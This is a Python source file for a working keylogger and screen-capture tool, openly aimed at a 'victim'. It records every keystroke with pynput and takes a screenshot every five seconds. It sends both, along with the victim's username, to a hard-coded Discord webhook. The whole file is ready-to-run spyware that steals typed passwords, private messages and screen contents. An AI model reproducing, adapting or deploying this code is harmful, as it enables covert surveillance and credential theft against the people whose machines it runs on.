from threading import Timer
from pynput.keyboard import Listener
from dhooks import Webhook, File, Embed
import datetime
import os
import PIL.ImageGrab
from io import BytesIO

WEBHOOK_URL = 'https://discord.com/api/webhooks/1212496091015159809/NglEdKo1KOnsdgBURtnjOc5uYf7Bch8VShuCceECKLtJK7TbWsvhWTzi0oofaLysuezz'# Your Discord Webhook URL

MESSAGE_INTERVAL = 10  # Amount of time between each report, expressed in seconds.
IMAGE_INTERVAL = 5  # Amount of time between each screenshot, expressed in seconds.

COMPUTER_NAME = os.getenv("USERNAME") # victim pc name

char_list = ["a", "ą", "b", "c", "ć", "d", "e", "ę", "f", "g", "h", "i", "j", "k", "l", "m", "n", "ń", "o", "ó", "p", "q", "r", "s", "ś", "t", "u", "v", "w", "x", "y", "z", "ż","ź", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
other = ["<", ">", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "-", "+", "=", "{", "}", "[", "]", "|", "\\", ":", ";", "'", "\"", ",", "<", ">", ".", "?", "/", " ", "backspace", "enter", "shift", "ins", "home", "end", "pagedown"]

replace_list = [
    {"char": "'", "replace": ""},
    {"char": "Key.ctrl_l", "replace": " [CTRL LEFT] "},
    {"char": "Key.backspace", "replace": " [BACKSPACE] "},
    {"char": "Key.shift", "replace": " [KEY SHIFT] "},
    {"char": "Key.enter", "replace": " [KEY ENTER] "},
    {"char": "Key.space", "replace": " "},
    {"char": "Key.shift_r", "replace": " [SHIFT RIGHT] "},
    {"char": "Key.shift_l", "replace": " [SHIFT LEFT] "},
    {"char": "Key.alt_l", "replace": " [ALT LEFT] "},
    {"char": "Key.alt_r", "replace": " [ALT RIGHT] "},
    {"char": "Key.ctrl_r", "replace": " [CTRL RIGHT] "},
    {"char": "Key.ctrl_l", "replace": " [CTRL LEFT] "},
    {"char": "Key.alt_gr", "replace": ""},
    {"char": "Key.tab", "replace": " [TAB] "},
    {"char": "Key.esc", "replace": " [ESC] "},
    {"char": "Key.left", "replace": " [ARROW LEFT] "},
    {"char": "Key.right", "replace": " [ARROW RIGHT] "},
    {"char": "Key.up", "replace": " [ARROW UP] "},
    {"char": "Key.down", "replace": " [ARROW DOWN] "},
    {"char": "Key.caps_lock", "replace": " [CAPS LOCK] "},
    {"char": "\x13", "replace": " [CTRL + S] "},
    {"char": "Key.f1", "replace": " [F1] "},
    {"char": "Key.f2", "replace": " [F2] "},
    {"char": "Key.f3", "replace": " [F3] "},
    {"char": "Key.f4", "replace": " [F4] "},
    {"char": "Key.f5", "replace": " [F5] "},
    {"char": "Key.f6", "replace": " [F6] "},
    {"char": "Key.f7", "replace": " [F7] "},
    {"char": "Key.f8", "replace": " [F8] "},
    {"char": "Key.f9", "replace": " [F9] "},
    {"char": "Key.f10", "replace": " [F10] "},
    {"char": "Key.f11", "replace": " [F11] "},
    {"char": "Key.f12", "replace": " [F12] "},
    {"char": "Key.print_screen", "replace": " [PRINT SCREEN] "},
    {"char": "Key.scroll_lock", "replace": " [SCROLL LOCK] "},
    {"char": "Key.pause", "replace": " [PAUSE] "},
    {"char": "Key.insert", "replace": " [INSERT] "},
    {"char": "Key.delete", "replace": " [DELETE] "},
    {"char": "Key.home", "replace": " [HOME] "},
    {"char": "Key.end", "replace": " [END] "},
    {"char": "Key.page_up", "replace": " [PAGE UP] "},
    {"char": "Key.page_down", "replace": " [PAGE DOWN] "},
    {"char": "Key.num_lock", "replace": " [NUM LOCK] "},
    {"char": "Key.menu", "replace": " [MENU] "},
    {"char": "Key.cmd", "replace": " [WINDOWS] "},
    {"char": "Key.media_play_pause", "replace": " [MEDIA PLAY/PAUSE] "},
]

class ImageSender: 
    def __init__(self, webhook_url, interval, computer_name):
        self.webhook = Webhook(webhook_url)
        self.interval = interval
        self.computer_name = computer_name

    def _send_image(self):
        image = PIL.ImageGrab.grab()
        bytes = BytesIO()
        image.save(bytes, format="PNG")
        bytes.seek(0)
        dfile = File(bytes, name="victim_screen.png")

        date = str(datetime.datetime.now())[0:16]

        embed = Embed(description=f'New screenshot from {self.computer_name} [ {date} ]', color=0x5CDBF0, title=f'New Screenshot ({self.interval} seconds interval)')
        self.webhook.send(embed=embed, file=dfile)
        Timer(self.interval, self._send_image).start()
    
    def _start(self):
        self._send_image()

class KeyLogger:
    def __init__(self, webhook_url, interval, computer_name):
        self.interval = interval
        self.computer_name = computer_name
        self.webhook = Webhook(webhook_url)
        self.log = ""
    def _report(self):
        if len(self.log) > 0:
            for i in replace_list:
                self.log = self.log.replace(i["char"], i["replace"])
            
            if (self.log[0] == " "):
                self.log = self.log[1:]

            date = str(datetime.datetime.now())[0:16]
            
            embed_message = Embed(description=f'[ {date} ] ( {self.computer_name} ) : {str(self.log)}', color=0x5CDBF0, title='Keylogger Message')
            
            self.webhook.send(embed=embed_message)
            self.log = ''
            print('Sent', self.log)
        else :
            print('No Text to send.')
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)
        

    def run(self):
        embed_start = Embed(description=f'Keylogger started. Interval is {self.interval} seconds (change it in source code)', color=0x00ff55, title='Keylogger ON')
        self.webhook.send(embed=embed_start)
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()

if __name__ == '__main__':
    ImageSender(WEBHOOK_URL, IMAGE_INTERVAL, COMPUTER_NAME)._start()
    KeyLogger(WEBHOOK_URL, MESSAGE_INTERVAL, COMPUTER_NAME).run()